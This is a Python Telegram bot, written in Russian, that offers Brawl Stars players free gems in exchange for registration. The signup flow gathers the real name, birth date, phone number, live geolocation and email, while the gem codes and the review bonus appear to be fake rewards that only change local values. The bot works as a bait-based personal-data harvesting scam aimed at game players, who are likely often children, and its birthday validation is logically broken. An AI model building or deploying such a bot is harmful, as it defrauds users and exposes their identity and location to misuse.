import logging #

from datetime import datetime

from aiogram import Bot, Dispatcher, types, executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup

from decouple import config
from utils import *

logging.basicConfig(level=logging.INFO)

API_TOKEN = config('API_TOKEN')


bot = Bot(token=API_TOKEN)

# For example use simple MemoryStorage for Dispatcher.
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


# States
class Regist(StatesGroup):
   tag = State()
   tag_confirm = State()
   name = State()
   birthday = State()
   phone = State()
   location = State()
   email = State()

class Review(StatesGroup):
    text = State()


# ⚔️Главное меню⚔️
# 💎Free gems💎
# 🎁Подарки🎁
# Рулетка
# 📊Статистика📊
# 📝Правила📝
# 📞Связь с администрацией📞
main_menu = types.InlineKeyboardMarkup(row_width=2)
main_menu.row( types.InlineKeyboardButton(text="💎Free gems💎", callback_data="free_gems"),
    types.InlineKeyboardButton(text="🎁Подарки🎁", callback_data="gifts"))
main_menu.add(types.InlineKeyboardButton(text="🎰Рулетка🎰", callback_data="roulette"),
              types.InlineKeyboardButton(text="📊Статистика📊", callback_data="stats"))
main_menu.row(
    types.InlineKeyboardButton(text="📝Правила📝", callback_data="rules"),
    types.InlineKeyboardButton(text="📞Связь с администрацией📞", callback_data="contact_admin")
)
   
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("Привет!\nЯ бот для регистрации в БРАВЛ СТАРС CLOUD \n Пройди регистрацию и получи 599 гемов в подарок!")
    if get_user(message.from_user) is None:
        await message.answer("Слушай, ты еще не зарегистрирован, давай это исправим!")
        await Regist.tag.set()
        await message.answer("Введи свой тег в Бравл Старс")
    else:
        await message.answer("⚔️------Главное меню------⚔️", reply_markup=main_menu)


@dp.message_handler(state=Regist.tag)
async def process_tag(message: types.Message, state: FSMContext):
    bw_player = bw_info_by_nickname(message.text)
    if bw_player is None:
        await message.answer("Такого игрока не существует или ты ввел неверный тег, попробуй еще раз")
        return
    
    await state.update_data(tag=message.text) # сохраняем тег в состояние
    
    text = f"Твой никнейм: {bw_player.name}\nТвой тег: {bw_player.tag}"
    text += f"У тебя {bw_player.trophies} кубков\n"
    # if bw_player.club is not None:
    #     text += f"Ты состоишь в клубе {bw_player.club.name} с {bw_player.club.trophies} кубков"
    text += "\nВсе верно?"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text="🟢ДА", callback_data="yes"),
                types.InlineKeyboardButton(text="🔴НЕТ", callback_data="no"))
    
    await message.answer(text, reply_markup=markup)
    await Regist.next()
    
    
@dp.callback_query_handler(state=Regist.tag_confirm)
async def process_tag_confirm(call: types.CallbackQuery, state: FSMContext):
    if call.data == "yes":
        await call.message.answer("Отлично! Теперь введи свое Настоящее Имя")
        await Regist.next()
    else:
        await call.message.answer("Введи свой тег в Бравл Старс")
        await Regist.tag.set()

@dp.message_handler(state=Regist.name)
async def process_name(message: types.Message, state: FSMContext):
    await state.update_data(name=message.text)
    await message.answer("Теперь введи свою дату рождения в формате ДД.ММ.ГГГГ\nНапример: 30.12.2000")
    await Regist.next()
    
@dp.message_handler(state=Regist.birthday)
async def process_birthday(message: types.Message, state: FSMContext):
    date = datetime.strptime(message.text, '%d.%m.%Y')
    if date is None and date.year < 1950 and date.year > datetime.now().year:
        await message.answer("Неверный формат даты, попробуй еще раз")
        return
    
    await state.update_data(birthday=message.text)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton(text="Отправить мой номер телефона", request_contact=True))
    
    text = "Теперь отправь просто номер телефона нажав на кнопку ниже 👇"
    
    await message.answer(text, reply_markup=markup)

    await Regist.next()


@dp.message_handler(state=Regist.phone, content_types=types.ContentTypes.CONTACT)
async def process_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.contact.phone_number)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton(text="Отправить мою геолокацию", request_location=True))
    
    text = "Теперь отправь просто геолокацию нажав на кнопку ниже 👇"
    
    await message.answer(text, reply_markup=markup)

    await Regist.next()
    
    
@dp.message_handler(state=Regist.location, content_types=types.ContentTypes.LOCATION)
async def process_location(message: types.Message, state: FSMContext):
    await state.update_data(location=message.location)
    
    await message.answer("Теперь отправь свой email", reply_markup=types.ReplyKeyboardRemove())
    
    await Regist.next()
    


    
@dp.message_handler(state=Regist.email)
async def process_email(message: types.Message, state: FSMContext):
    if not check_email(message.text):
        await message.answer("Неверный формат email, попробуй еще раз")
        return
    
    await state.update_data(email=message.text)
    
    data = await state.get_data()
    user_data = crete_user(data, message.from_user)
    
    await message.answer("Отлично! Теперь ты зарегистрирован в нашей системе")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text="💎Получить гемы💎", callback_data="get_gems"))
    
    await message.answer("Теперь ты можешь получить 599💎 гемов в подарок", reply_markup=markup)
    
    await state.finish()
    

@dp.callback_query_handler(lambda c: c.data == "get_gems")
async def process_get_gems(call: types.CallbackQuery):
    code = gen_code_gem()
    await call.message.answer(f"Твой код для получения гемов: {code}")
    await call.message.answer("Отправь отзыв о нашем боте и получи 1000💎 гемов в подарок 🎁")
    await call.message.answer("Отправь свой отзыв в виде текста")
    await Review.text.set()
    
@dp.message_handler(state=Review.text)
async def process_review(message: types.Message, state: FSMContext):
    await state.update_data(text=message.text)
    text = "Cпасибо за отзыв! Твои 1000💎 гемов уже на твоем счету"
    user = get_user(message.from_user)
    user['gems'] += 1000
    text += f"\nТвой баланс: {user['gems']}💎"
    await message.answer(text, reply_markup=main_menu)
    await state.finish()






executor.start_polling(dp, skip_updates=True)